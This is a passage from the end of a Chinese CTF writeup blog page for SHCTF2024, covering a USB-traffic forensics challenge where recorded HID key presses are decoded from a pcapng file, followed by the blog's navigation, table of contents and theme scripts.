天命人</h2><p>题目里是一个抓usb接口的pcapng文件<br>kali打开，获取HID Data：<br><img src="/resources/images/SHCTF2024WriteUpassert/1730010625449-ba6569ab-136a-48c9-989a-851935d08676.webp" alt="image.png"></p><p>利用某位出题人博客上的脚本<a target="_blank" rel="noopener" href="https://j-0k3r.github.io/2024/04/26/ps5%E6%89%8B%E6%9F%84usb&%E8%93%9D%E7%89%99%E6%B5%81%E9%87%8F%E5%8D%8F%E8%AE%AE/">这里</a>得到按键：<br><img src="/resources/images/SHCTF2024WriteUpassert/1730010982513-fac8ebf1-ed47-4c37-8a75-9330ce7d6c53.webp" alt="image.png"></p><p>按照规则整理：<br><img src="/resources/images/SHCTF2024WriteUpassert/1730011039926-1d95df75-68a0-4e37-bc06-b98114543cea.webp" alt="image.png"></p></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>Author:</span> <span class="post-copyright-info"><a href="https://k0re.xyz">k0relapse</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>Link:</span> <span class="post-copyright-info"><a href="https://k0re.xyz/2024/11/20/SHCTF2024%20WriteUp/">https://k0re.xyz/2024/11/20/SHCTF2024%20WriteUp/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>Copyright Notice:</span> <span class="post-copyright-info">All articles on this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless otherwise stated.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/WriteUp/">WriteUp</a></div><div class="post-share"><div class="social-share" data-image="/resources/images/ArticleTopImages/SHCTF2024.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload='this.media="all"'><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/2024/11/21/2024-11%20WriteUp/" title="贰零贰肆年拾壹月·散装刷题月记"><img class="cover" src="/resources/images/ArticleTopImages/2024_11_ShirakawaHiyori.webp" onerror='onerror=null,src="/img/404.jpg"' alt="cover of previous post"><div class="info"><div class="info-1"><div class="info-item-1">Previous</div><div class="info-item-2">贰零贰肆年拾壹月·散装刷题月记</div></div><div class="info-2"><div class="info-item-1">🥬🐶笑传之做题月记</div></div></div></a><a class="pagination-related" href="/2024/11/19/Hackergame%202024%20WriteUp/" title="Hackergame 2024 WriteUp"><img class="cover" src="/resources/images/ArticleTopImages/Hackergame2024.jpg" onerror='onerror=null,src="/img/404.jpg"' alt="cover of next post"><div class="info text-right"><div class="info-1"><div class="info-item-1">Next</div><div class="info-item-2">Hackergame 2024 WriteUp</div></div><div class="info-2"><div class="info-item-1">🥬🐶传奇之Hackergame2024篇</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>Related Articles</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/2024/11/19/Hackergame%202024%20WriteUp/" title="Hackergame 2024 WriteUp"><img class="cover" src="/resources/images/ArticleTopImages/Hackergame2024.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2024-11-19</div><div class="info-item-2">Hackergame 2024 WriteUp</div></div><div class="info-2"><div class="info-item-1">🥬🐶传奇之Hackergame2024篇</div></div></div></a></div></div><hr class="custom-hr"><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i> <span>Comments</span></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/avatar_FHD.webp" onerror='this.onerror=null,this.src="/img/friend_404.gif"' alt="avatar"></div><div class="author-info-name">k0relapse</div><div class="author-info-description"></div><div class="site-data"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">6</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">3</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">1</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/k0relapse"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Contents</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Web"><span class="toc-number">1.</span> <span class="toc-text">Web</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%C2%B7-MD5-master%EF%BC%81"><span class="toc-number">1.1.</span> <span class="toc-text">· MD5 master！</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%C2%B7-1zFlask"><span class="toc-number">1.2.</span> <span class="toc-text">· 1zFlask</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%C2%B7-%E8%9B%90%E8%9B%90-%E8%9B%90%E8%9B%90"><span class="toc-number">1.3.</span> <span class="toc-text">· 蛐蛐?蛐蛐!</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%C2%B7-%E5%8D%95%E8%BA%AB%E5%8D%81%E5%85%AB%E5%B9%B4%E7%9A%84%E6%89%8B%E9%80%9F"><span class="toc-number">1.4.</span> <span class="toc-text">· 单身十八年的手速</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%C2%B7-ez-gittt"><span class="toc-number">1.5.</span> <span class="toc-text">· ez_gittt</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%C2%B7-Jvav"><span class="toc-number">1.6.</span> <span class="toc-text">· Jvav</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%C2%B7-poppopop"><span class="toc-number">1.7.</span> <span class="toc-text">· poppopop</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%C2%B7-%E7%99%BB%E9%99%86%E9%AA%8C%E8%AF%81"><span class="toc-number">1.8.</span> <span class="toc-text">· 登陆验证</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%C2%B7-guess-the-number"><span class="toc-number">1.9.</span> <span class="toc-text">· guess_the_number</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%C2%B7-%E8%87%AA%E5%8A%A9%E6%9F%A5%E8%AF%A2"><span class="toc-number">1.10.</span> <span class="toc-text">· 自助查询</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%C2%B7-%E6%8B%9C%E5%B8%88%E4%B9%8B%E6%97%85%C2%B7%E7%95%AA%E5%A4%96"><span class="toc-number">1.11.</span> <span class="toc-text">· 拜师之旅·番外</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%C2%B7-%E5%B0%8F%E5%B0%8Fcms"><span class="toc-number">1.12.</span> <span class="toc-text">· 小小cms</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Misc"><span class="toc-number">2.</span> <span class="toc-text">Misc</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%C2%B7-%E6%9C%89WiFi%E5%B9%B2%E5%98%9B%E4%B8%8D%E7%94%A8%E5%91%A2%EF%BC%9F"><span class="toc-number">2.1.</span> <span class="toc-text">· 有WiFi干嘛不用呢？</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%C2%B7-%E6%8B%9C%E5%B8%88%E4%B9%8B%E6%97%85%E2%91%A0"><span class="toc-number">2.2.</span> <span class="toc-text">· 拜师之旅①</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%C2%B7-%E7%9C%9F%E7%9C%9F%E5%81%87%E5%81%87-%E9%81%AE%E9%81%AE%E6%8E%A9%E6%8E%A9"><span class="toc-number">2.3.</span> <span class="toc-text">· 真真假假?遮遮掩掩!</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%C2%B7-Rasterizing-Traffic"><span class="toc-number">2.4.</span> <span class="toc-text">· Rasterizing Traffic</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%C2%B7-Quarantine"><span class="toc-number">2.5.</span> <span class="toc-text">· Quarantine</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%C2%B7-%E9%81%AE%E9%81%AE%E6%8E%A9%E6%8E%A9%EF%BC%9FCCRC"><span class="toc-number">2.6.</span> <span class="toc-text">· 遮遮掩掩？CCRC!</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%C2%B7-%E6%8B%9C%E5%B8%88%E4%B9%8B%E6%97%85%E2%91%A1"><span class="toc-number">2.7.</span> <span class="toc-text">· 拜师之旅②</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%C2%B7-%E7%BB%83%E5%81%87%E6%88%90%E7%9C%9F"><span class="toc-number">2.8.</span> <span class="toc-text">· 练假成真</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%C2%B7-Schneider"><span class="toc-number">2.9.</span> <span class="toc-text">· Schneider</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%C2%B7-%E6%8B%9C%E5%B8%88%E4%B9%8B%E6%97%85%E2%91%A2"><span class="toc-number">2.10.</span> <span class="toc-text">· 拜师之旅③</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%C2%B7-%E4%BB%8A%E6%97%A5%E6%97%A0%E4%BA%8B%EF%BC%8C%E5%8B%BE%E6%A0%8F%E5%90%AC%E6%9B%B2"><span class="toc-number">2.11.</span> <span class="toc-text">· 今日无事，勾栏听曲</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%C2%B7-%E5%A4%A9%E5%91%BD%E4%BA%BA"><span class="toc-number">2.12.</span> <span class="toc-text">· 天命人</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Posts</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2024/12/10/%E5%BC%BA%E7%BD%91%E6%9D%AF%E9%9D%92%E5%B0%91%E8%B5%9B%202024%20%E5%AE%9E%E8%B7%B5%E8%B5%9BWriteUp/" title="强网青少 2024 创新赛 WriteUp"><img src="/resources/images/ArticleTopImages/qwb_qs-cx_2024.webp" onerror='this.onerror=null,this.src="/img/404.jpg"' alt="强网青少 2024 创新赛 WriteUp"></a><div class="content"><a class="title" href="/2024/12/10/%E5%BC%BA%E7%BD%91%E6%9D%AF%E9%9D%92%E5%B0%91%E8%B5%9B%202024%20%E5%AE%9E%E8%B7%B5%E8%B5%9BWriteUp/" title="强网青少 2024 创新赛 WriteUp">强网青少 2024 创新赛 WriteUp</a><time datetime="2024-12-09T16:00:00.000Z" title="Created 2024-12-10 00:00:00">2024-12-10</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/12/04/2024-12%20WriteUp/" title="贰零贰肆年拾贰月·散装刷题月记"><img src="/resources/images/ArticleTopImages/2024_12_Mizuha_Reading.webp" onerror='this.onerror=null,this.src="/img/404.jpg"' alt="贰零贰肆年拾贰月·散装刷题月记"></a><div class="content"><a class="title" href="/2024/12/04/2024-12%20WriteUp/" title="贰零贰肆年拾贰月·散装刷题月记">贰零贰肆年拾贰月·散装刷题月记</a><time datetime="2024-12-03T16:00:00.000Z" title="Created 2024-12-04 00:00:00">2024-12-04</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/11/21/2024-11%20WriteUp/" title="贰零贰肆年拾壹月·散装刷题月记"><img src="/resources/images/ArticleTopImages/2024_11_ShirakawaHiyori.webp" onerror='this.onerror=null,this.src="/img/404.jpg"' alt="贰零贰肆年拾壹月·散装刷题月记"></a><div class="content"><a class="title" href="/2024/11/21/2024-11%20WriteUp/" title="贰零贰肆年拾壹月·散装刷题月记">贰零贰肆年拾壹月·散装刷题月记</a><time datetime="2024-11-20T16:00:00.000Z" title="Created 2024-11-21 00:00:00">2024-11-21</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/11/20/SHCTF2024%20WriteUp/" title="SHCTF2024 WriteUp"><img src="/resources/images/ArticleTopImages/SHCTF2024.jpg" onerror='this.onerror=null,this.src="/img/404.jpg"' alt="SHCTF2024 WriteUp"></a><div class="content"><a class="title" href="/2024/11/20/SHCTF2024%20WriteUp/" title="SHCTF2024 WriteUp">SHCTF2024 WriteUp</a><time datetime="2024-11-19T16:00:00.000Z" title="Created 2024-11-20 00:00:00">2024-11-20</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/11/19/index/" title="欢迎来到我的兔子洞🎉🎉🎉"><img src="/resources/images/ArticleTopImages/Homepage.webp" onerror='this.onerror=null,this.src="/img/404.jpg"' alt="欢迎来到我的兔子洞🎉🎉🎉"></a><div class="content"><a class="title" href="/2024/11/19/index/" title="欢迎来到我的兔子洞🎉🎉🎉">欢迎来到我的兔子洞🎉🎉🎉</a><time datetime="2024-11-18T16:00:00.000Z" title="Created 2024-11-19 00:00:00">2024-11-19</time></div></div></div></div></div></div></main><footer id="footer" style="background-image:url(/resources/images/ArticleTopImages/SHCTF2024.jpg)"><div id="footer-wrap"><div class="copyright">&copy;2024 By k0relapse</div><div class="framework-info"><span>Framework</span> <a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme</span> <a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Reading Mode"><i class="fas fa-book-open"></i></button><button id="translateLink" type="button" title="Toggle Between Traditional and Simplified Chinese">繁</button><button id="darkmode" type="button" title="Toggle Between Light and Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle Between Single-column and Double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="Settings"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table of Contents"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="Scroll to Comments"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="Back to Top"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.umd.min.js"></script><script src="https://cdn.jsdelivr.net/npm/instant.page/instantpage.min.js" type="module"></script><script src="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.js"></script><div class="js-pjax"><script>(() => {
  const isShuoshuo = GLOBAL_CONFIG_SITE.isShuoshuo
  const option = {"placeholder":"写点什么上来吧,也许会有有趣的事情发生哦( •̀ ω •́ )✧"}

  const initValine = (el, path) => {
    if (isShuoshuo) {
      window.shuoshuoComment.destroyValine = () => {
        if (el.children.length) {
          el.innerHTML = ''
          el.classList.add('no-comment')
        }
      }
    }

    const valineConfig = {
      el: '#vcomment',
      appId: 'nxcyV1X6p0KVm6cM1TX4gaQ1-gzGzoHsz',
      appKey: '74WbkCQcPlGGjIooK165lk7g',
      avatar: 'hide',
      serverURLs: '',
      emojiMaps: {"1":"https://k0re.xyz/emoji/emoji001.webp","2":"https://k0re.xyz/emoji/emoji002.webp","3":"https://k0re.xyz/emoji/emoji003.webp","4":"https://k0re.xyz/emoji/emoji004.webp","5":"https://k0re.xyz/emoji/emoji005.webp","6":"https://k0re.xyz/emoji/emoji006.webp","7":"https://k0re.xyz/emoji/emoji007.webp","8":"https://k0re.xyz/emoji/emoji008.webp","9":"https://k0re.xyz/emoji/emoji009.webp","10":"https://k0re.xyz/emoji/emoji010.webp","11":"https://k0re.xyz/emoji/emoji011.webp","12":"https://k0re.xyz/emoji/emoji012.webp","13":"https://k0re.xyz/emoji/emoji013.webp","14":"https://k0re.xyz/emoji/emoji014.webp","15":"https://k0re.xyz/emoji/emoji015.webp","16":"https://k0re.xyz/emoji/emoji016.webp","17":"https://k0re.xyz/emoji/emoji017.webp","18":"https://k0re.xyz/emoji/emoji018.webp","19":"https://k0re.xyz/emoji/emoji019.webp","20":"https://k0re.xyz/emoji/emoji020.webp","21":"https://k0re.xyz/emoji/emoji021.webp","22":"https://k0re.xyz/emoji/emoji022.webp","23":"https://k0re.xyz/emoji/emoji023.webp","24":"https://k0re.xyz/emoji/emoji024.webp","25":"https://k0re.xyz/emoji/emoji025.gif","26":"https://k0re.xyz/emoji/emoji026.gif","27":"https://k0re.xyz/emoji/emoji027.gif","28":"https://k0re.xyz/emoji/emoji028.gif","29":"https://k0re.xyz/emoji/emoji029.gif","30":"https://k0re.xyz/emoji/emoji030.gif","31":"https://k0re.xyz/emoji/emoji031.gif","32":"https://k0re.xyz/emoji/emoji032.gif","33":"https://k0re.xyz/emoji/emoji033.gif","34":"https://k0re.xyz/emoji/emoji034.gif","35":"https://k0re.xyz/emoji/emoji035.gif","36":"https://k0re.xyz/emoji/emoji036.gif","37":"https://k0re.xyz/emoji/emoji037.webp","38":"https://k0re.xyz/emoji/emoji038.webp","39":"https://k0re.xyz/emoji/emoji039.webp","40":"https://k0re.xyz/emoji/emoji040.webp","41":"https://k0re.xyz/emoji/emoji041.webp","42":"https://k0re.xyz/emoji/emoji042.webp","43":"https://k0re.xyz/emoji/emoji043.webp","44":"https://k0re.xyz/emoji/emoji044.webp","45":"https://k0re.xyz/emoji/emoji045.webp","46":"https://k0re.xyz/emoji/emoji046.webp","47":"https://k0re.xyz/emoji/emoji047.webp","48":"https://k0re.xyz/emoji/emoji048.webp","49":"https://k0re.xyz/emoji/emoji049.webp","50":"https://k0re.xyz/emoji/emoji050.webp","51":"https://k0re.xyz/emoji/emoji051.webp","52":"https://k0re.xyz/emoji/emoji052.webp","53":"https://k0re.xyz/emoji/emoji053.webp","54":"https://k0re.xyz/emoji/emoji054.webp","55":"https://k0re.xyz/emoji/emoji055.webp","56":"https://k0re.xyz/emoji/emoji056.webp","57":"https://k0re.xyz/emoji/emoji057.webp","58":"https://k0re.xyz/emoji/emoji058.webp","59":"https://k0re.xyz/emoji/emoji059.webp"},
      visitor: false,
      ...option,
      path: isShuoshuo ? path : (option && option.path) || window.location.pathname
    }

    new Valine(valineConfig)
  }

  const loadValine = async (el, path) => {
    if (typeof Valine === 'function') {
      initValine(el, path)
    } else {
      await btf.getScript('https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js')
      initValine(el, path)
    }
  }

  if (isShuoshuo) {
    'Valine' === 'Valine'
      ? window.shuoshuoComment = { loadComment: loadValine }
      : window.loadOtherComment = loadValine
    return
  }

  if ('Valine' === 'Valine' || !false) {
    if (false) btf.loadComment(document.getElementById('vcomment'),loadValine)
    else setTimeout(loadValine, 0)
  } else {
    window.loadOtherComment = loadValine
  }
})()</script></div><script async src="/js/diytitle.js"></script><script src="https://libs.baidu.com/jquery/2.1.1/jquery.min.js"></script><script src="/js/sakura.js"></script><div class="aplayer no-destroy" data-id="12881846957" data-server="netease" data-type="playlist" data-fixed="true" data-autoplay="true"></div><script defer id="fluttering_ribbon" mobile="true" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/canvas-fluttering-ribbon.min.js"></script><script id="click-show-text" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/click-show-text.min.js" data-mobile="true" data-text="御桜稟,夏目雫,草薙直哉,川内野优美,冰川里奈,鸟谷真琴,草薙健一郎,夏目蓝,夏目水菜,夏目圭,中村章一,明石亘,托马斯,弗里德曼,明石小沙智,明石小牧,草薙水菜,吹,长山香奈,柊乃乃未,咲崎桜子,栗山奈津子,本间心铃,鸟谷静流,中村丽华,冰川露莉莴,川内野铃菜,恩田宁,恩田放哉,本间礼次郎,宫崎破戒,坂本彰三,村田清彦,片贝巧实,夏目依瑠,恩田雾乃" data-fontsize="20px" data-random="true" async></script><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css" media="print" onload='this.media="all"'><script src="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/metingjs/dist/Meting.min.js"></script><script>(() => {
  const destroyAplayer = () => {
    if (window.aplayers) {
      for (let i = 0; i < window.aplayers.length; i++) {
        if (!window.aplayers[i].options.fixed) {
          window.aplayers[i].destroy()
        }
      }
    }
  }

  const runMetingJS = () => {
    typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()
  }

  btf.addGlobalFn('pjaxSend', destroyAplayer, 'destroyAplayer')
  btf.addGlobalFn('pjaxComplete', loadMeting, 'runMetingJS')
})()</script><script src="https://cdn.jsdelivr.net/npm/pjax/pjax.min.js"></script><script>(() => {
  const pjaxSelectors = ["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]

  window.pjax = new Pjax({
    elements: 'a:not([target="_blank"])',
    selectors: pjaxSelectors,
    cacheBust: false,
    analytics: false,
    scrollRestoration: false
  })

  const triggerPjaxFn = (val) => {
    if (!val) return
    Object.values(val).forEach(fn => fn())
  }

  document.addEventListener('pjax:send', () => {
    // removeEventListener
    btf.removeGlobalFnEvent('pjaxSendOnce')
    btf.removeGlobalFnEvent('themeChange')

    // reset readmode
    const $bodyClassList = document.body.classList
    if ($bodyClassList.contains('read-mode')) $bodyClassList.remove('read-mode')

    triggerPjaxFn(window.globalFn.pjaxSend)
  })

  document.addEventListener('pjax:complete', () => {
    btf.removeGlobalFnEvent('pjaxCompleteOnce')
    document.querySelectorAll('script[data-pjax]').forEach(item => {
      const newScript = document.createElement('script')
      const content = item.text || item.textContent || item.innerHTML || ""
      Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
      newScript.appendChild(document.createTextNode(content))
      item.parentNode.replaceChild(newScript, item)
    })

    triggerPjaxFn(window.globalFn.pjaxComplete)
  })

  document.addEventListener('pjax:error', e => {
    if (e.request.status === 404) {
      pjax.loadUrl('/404.html')
    }
  })
})()</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">Search</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="text-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i> <span>Loading Database</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="快！让我访问！" type="text"></div></div><hr><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js"></script></div></div></body></html>